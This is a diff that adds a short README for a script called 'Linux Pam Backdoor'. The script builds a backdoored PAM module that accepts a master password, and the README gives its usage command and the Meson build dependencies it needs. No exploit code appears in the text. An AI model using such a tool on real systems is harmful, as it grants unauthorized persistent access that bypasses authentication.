@@ -1,0 +1,11 @@
+Linux Pam Backdoor
+
+This script automates the creation of a backdoor for Linux systems
+
+Usage
+To run this program, use python3 PAM.py -v 1.7.2 -p "your master password"
+
+Prior to running, make sure Meson is installed (not necessary with the Ansible playbook)
+
+sudo apt update
+sudo apt install meson ninja-build build-essential
